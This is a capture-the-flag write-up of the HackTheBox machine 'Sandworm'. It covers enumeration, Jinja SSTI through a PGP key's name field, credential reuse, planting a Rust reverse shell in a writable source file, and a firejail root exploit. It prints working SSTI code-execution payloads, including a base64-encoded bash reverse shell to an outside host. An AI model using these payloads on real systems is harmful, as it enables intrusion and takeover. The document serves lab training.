---
title: "Sandworm HackTheBox"
layout: post
date: 2023-11-18 12:00
tag: 
- HackTheBox
- Pentesting
- Sandworm
- Linux
- Meduim
- SSTI
- PGP
- Firejail
image: https://www.hackthebox.com/storage/avatars/93c53cc1fc0284e5d9d74a565a8b9bf0.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

A meduim HackTheBox linux machine which exploits an SSTI vunerability in PGP verify signing functionality in a website. And the privilege escalation is about a local root exploit reachable via --join logic in firejail.

---

# Nmap

```bash
nmap -A -T4 10.10.11.218
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 19:08 +01
Nmap scan report for 10.10.11.218
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking the web page at port 80 which redirects us automatically to the one on port 443 :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111191047.png>)

# Gobuster

```bash
gobuster dir -u https://ssa.htb -w /usr/share/wordlists/dirb/common.txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ssa.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 5584]
/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
/contact              (Status: 200) [Size: 3543]
/guide                (Status: 200) [Size: 9043]
/login                (Status: 200) [Size: 4392]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/pgp                  (Status: 200) [Size: 3187]
/process              (Status: 405) [Size: 153]
/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Gobuster shows an admin panel where I cannot login because I don't have any credentials at the moment :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111200209.png>)

The *contact* endpoint contains a place where we can input our encrypted text. From the information on the page we can understand that the text would be encrypted using PGP :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112124515.png>)

In the *guide* endpoint we can encrypt and decrypt a text using a public key :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112124434.png>)

And the *pgp* endpoint contains the public key we can use :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111200124.png>)

To test this functionality, I encrypted a text using the public key found and tried to decrypt it there :

[https://8gwifi.org/pgpencdec.jsp](https://8gwifi.org/pgpencdec.jsp)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112124327.png>)

And I got the expected output :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112124626.png>)

Then I pasted my encrypted text again in the *contact* endpoint, and I get a Thank you response. Till now everything seems to be okay.

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111194531.png>)

Bellow the encryption/decryption options, there is an option to verify a signature :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111194500.png>)

So to test, I generated a key and entered my name and email :

[https://steemit.com/encryption/@dhumphrey/gpg-pgp-command-line-basic-tutorial](https://steemit.com/encryption/@dhumphrey/gpg-pgp-command-line-basic-tutorial)

```bash
gpg --gen-key
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111195128.png>)

Then a created my public key which I will use to sign my text :

```bash
gpg --armor --export test@test.com > publickey.asc
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112123412.png>)

After that I signed my text file :

```bash
gpg --clear-sign --output test_signed.asc test.txt
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112123948.png>)

Now I can use the signed text file and my public key to verify the signature :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112124117.png>)

Heem I saw that this functionality reflects my name used to generate the key, so I thought about SSTI :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112124826.png>)

# SSTI exploitation

{% raw %}
So now to test I will input the famous SSTI payload `{{7*7}}` in the name field, and see if I get 49 instead of `{{7*7}}` in the verify signature output :
{% endraw %}

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112123124.png>)

```bash
gpg --list-keys
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112125606.png>)

Again I generated my public key and signed my test txt file :

```bash
gpg --armor --export test@ssti.com > sstipubkey.asc
gpg --clear-sign --output test_ssti_signed.asc test.txt
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112125220.png>)

Voilà! the name field is vulnerable to SSTI! Let's go further :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112125540.png>)

We can see the output of the id command using the following payload as a name :

{% raw %}
```js
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
{% endraw %}

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112130122.png>)

After many tries to find the exact payload to get a revshell, since the field input doesn't accept `< and >` as inputs, I was able to construct a valid one by base64 encoding my payload :

{% raw %}
```js
{{request.application.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvOTk5OSAwPiYxJw==" | base64 -d | bash').read()}}
```
{% endraw %}

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112132044.png>)

Now I am in as atlas user :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112132000.png>)

# atlas -> silentobserver

While turning around to find something for my horizontal privilege escalation, I found a json file in `/home/atlas/.config/httpie/sessions/localhost_5000` which contained the credentials of the silentobserver user :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112195834.png>)

Now I am in as silentobserver user :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112195752.png>)

And I can read the user flag :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112195953.png>)

# PE

Upon looking for files with SUID permissions, I found `firejail` file which is owned by root and belongs to the `jailer` group.

>Firejail is a setuid-root command line program that allows to execute programs in isolated sandboxes.

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112201141.png>)

I found that there is a CVE-2022-31214 for firejail under the title "local root exploit reachable via --join logic", and I found an exploit for it :

[https://seclists.org/oss-sec/2022/q2/188](https://seclists.org/oss-sec/2022/q2/188)
[https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)

Since I am not a `jailer` group member I cannot exploit that because I cannot run the firejail command, so I tired to escalate to atlas user again maybe he's a part of this group :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112201053.png>)

While trying to figure out a way to escalate, I found an interesting file in `/opt/tipnet` which is owned by atlas user :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112204852.png>)

The `tipnet` binary file, runs the rust files listed in `tipnet.d` , I checked if any of them is writable so I can inject a reverse shell payload there, and I found that `lib.rs` is writable!

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112201512.png>)

The link bellow shows how to create a reverse shell payload in Rust :

[https://www.reddit.com/r/rust/comments/fsxaaa/writing_a_reverse_shell_in_rust](https://www.reddit.com/r/rust/comments/fsxaaa/writing_a_reverse_shell_in_rust)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112203028.png>)

After modifying that file I set up my listener and waited for the connection back, and after some moments I got it, and you can see the atlas user is really a part of the `jailer` group :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112202719.png>)

So now I run the exploit, and run the `su -` command in another terminal as described in the exploit : 

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112203906.png>)

AND IT WORKED! I am root!

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231112203814.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>